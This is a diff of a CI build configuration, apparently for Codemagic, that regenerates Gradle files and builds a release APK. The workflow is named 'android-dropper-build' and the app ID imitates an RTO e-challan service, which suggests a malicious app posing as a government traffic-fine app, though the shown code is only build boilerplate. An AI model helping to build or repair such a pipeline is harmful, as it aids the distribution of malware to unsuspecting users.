@@ -1,44 +1,63 @@
 workflows:
   android-dropper-build:
-    name: RTO-Bypass-Final
+    name: RTO-Force-Final
     max_build_duration: 60
     instance_type: mac_mini_m2
     environment:
       java: 17
     scripts:
-      - name: Force Everything Bypass
+      - name: Force Everything
         script: |
-          # 1. Project folder mein enter karo
+          # 1. Purani sab kachra files delete (Bypass Mode)
           cd RtoEChallan || cd .
+          rm -rf .gradle gradle gradlew gradlew.bat settings.gradle build.gradle app/build.gradle
+          
+          # 2. Fresh Repo Setup (Plugin error fix)
+          cat <<EOF > settings.gradle
+          pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
+          dependencyResolutionManagement { 
+              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
+              repositories { google(); mavenCentral() } 
+          }
+          include ':app'
+          EOF
 
-          # 2. Purani files ka lafda khatam (Bypass Error 11831.jpg)
-          rm -f settings.gradle build.gradle gradlew gradlew.bat
-          rm -rf gradle/
-
-          # 3. FRESH SETTINGS (Bypass block errors)
-          echo "include ':app'" > settings.gradle
-
-          # 4. FRESH PROJECT BUILD.GRADLE (Bypass Plugin Not Found)
+          # 3. Project-Level Build File
           cat <<EOF > build.gradle
           buildscript {
               repositories { google(); mavenCentral() }
-              dependencies { classpath 'com.android.tools.build:gradle:8.2.0' }
-          }
-          allprojects {
-              repositories { google(); mavenCentral() }
+              dependencies { classpath 'com.android.tools.build:gradle:8.2.0'; classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.9.0' }
           }
           EOF
 
-          # 5. UI Injection (Logo setup)
+          # 4. App-Level Build File (Direct APK Logic)
+          mkdir -p app
+          cat <<EOF > app/build.gradle
+          plugins { id 'com.android.application'; id 'org.jetbrains.kotlin.android' }
+          android {
+              namespace 'com.rto.echallan'
+              compileSdk 34
+              defaultConfig { applicationId "com.rto.echallan"; minSdk 24; targetSdk 34; versionCode 1; versionName "1.0" }
+              buildTypes { release { minifyEnabled false } }
+              compileOptions { sourceCompatibility JavaVersion.VERSION_17; targetCompatibility JavaVersion.VERSION_17 }
+              kotlinOptions { jvmTarget = '17' }
+          }
+          dependencies {
+              implementation 'androidx.core:core-ktx:1.12.0'
+              implementation 'androidx.appcompat:appcompat:1.6.1'
+              implementation 'com.google.android.material:material:1.11.0'
+          }
+          EOF
+
+          # 5. Logo Injection (Force)
           mkdir -p app/src/main/res/drawable
           find $CM_BUILD_DIR -iname "mainlogo.png" -exec cp {} app/src/main/res/drawable/mainlogo.png \;
 
-          # 6. GENERATE FRESH WRAPPER (Bypass Status 127)
-          # Ye command gradlew files ko force generate karegi
+          # 6. Fresh Gradlew Generation (Status 127 Fix)
           gradle wrapper --gradle-version 8.2
           chmod +x gradlew
-
-          # 7. FINAL BUILD
+          
+          # 7. Final Command
           ./gradlew assembleRelease --no-daemon
           
     artifacts:
